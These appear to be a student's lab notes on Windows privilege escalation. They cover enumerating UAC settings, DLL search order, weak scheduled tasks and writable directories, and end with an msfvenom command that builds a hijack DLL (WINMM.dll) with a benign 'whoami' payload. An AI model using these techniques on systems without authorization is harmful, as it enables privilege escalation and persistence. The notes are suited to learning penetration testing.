net use * http://live.sysinternals.com

==================WINDOWS PRIVILEGE ESCALATION, PERSISTENCE, AND COVERING TRACKS=======================


Security Descriptor
Identifies the objectâ€™s owner and can also contain the following access control lists:

DACL - identifies the users and groups allowed or denied access to the object

SACL - controls how the system audits attempts to access the object

ACE - specifies a set of access rights and contains a SID that identifies a trustee for whom the rights are allowed, denied, or audited. A trustee can be a user account, group account, or logon session



DLL search order:

program checks the following registry location and will attempt to use the last known location of the DLL

reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"

 - if not found checks
	The directory the the Application was run from
	The current directory


checking uac settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System


auto elevate executables
	requested execution levels 
		asInvoker
		highestAvailable
		
navigate to sysinternals folder run sigcheck -m <specified program>


sigcheck:
(Get-Command eventvwr.exe).Path
sigcheck -m C:\WINDOWS\system32\eventvwr.exe


Finding vulnerable Scheduled Tasks

- schtasks /query /fo LIST /v
	List all Tasks in List format

- schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
	Select-String can utilize regex to output only values that match

- schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.

- schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
Excludes results that we dont want to seein order to help narrow down vulnerable directory locations



Open and view tasks from the Task Scheduler GUI Application

C:\Users\student\exercise_2\putty.exe
- Run: sigcheck c:\users\student\exercise_2\putty.exe
	Determines information we can use to research for vulnerabilities

- Run: icacls "c:\users\student\exercise_2"
	Check if the directory can be written to, as it is non-standard





Where ddls are found:
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    The directory the the Application was run from
    The directory specified in in the C+ function GetSystemDirectory()
    The directory specified in the C+ function GetWindowsDirectory()
    The current directory

Check UAC settings:
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  

Get-EventLog -Logname Security -Newest 50 -Index 7045 | fl


============================================================================================================
Check UAC settings:
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  

Get-EventLog -Logname Security -Newest 50 -Index 7045 | fl

dll jiacking:

msfvenom -p windows/exec CMD='cmd.exe /C whoami >C:\\whoami.txt' -f dll > WINMM.dll

bin replacement:

msfvenom -p windows/exec CMD='cmd.exe /C whoami >C:\\whoami.txt' -f dll > WINMM.dll






















































